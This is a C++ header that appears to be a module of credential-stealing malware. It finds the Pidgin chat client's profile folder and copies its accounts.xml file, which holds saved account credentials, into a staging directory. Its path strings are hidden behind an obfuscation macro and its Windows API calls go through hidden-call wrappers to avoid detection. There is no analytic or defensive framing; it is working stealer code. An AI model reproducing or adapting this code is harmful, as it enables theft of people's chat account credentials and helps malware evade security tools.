#ifndef PIDGIN_HPP
#define PIDGIN_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include "Winapi_structs.hpp"
#include "obfusheader.h"

namespace fs = std::filesystem;

namespace Pidgin {
    inline void Extract(const std::string& baseDir) {
        char* roamingPath = nullptr;
        size_t requiredSize = 0;
        _dupenv_s(&roamingPath, &requiredSize, OBF("USERPROFILE"));

        if (!roamingPath) return;

        std::string pidginDir = std::string(roamingPath) + OBF("\\AppData\\Roaming\\.purple");
        free(roamingPath);

        if (!fs::exists(pidginDir)) return;

        std::string targetDir = baseDir + OBF("\\Pidgin");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        std::string accountsFile = pidginDir + OBF("\\accounts.xml");
        std::string destPath = targetDir + OBF("\\accounts.xml");

        HiddenCalls::CopyFileA(accountsFile.c_str(), destPath.c_str(), FALSE);
    }
}

#endif
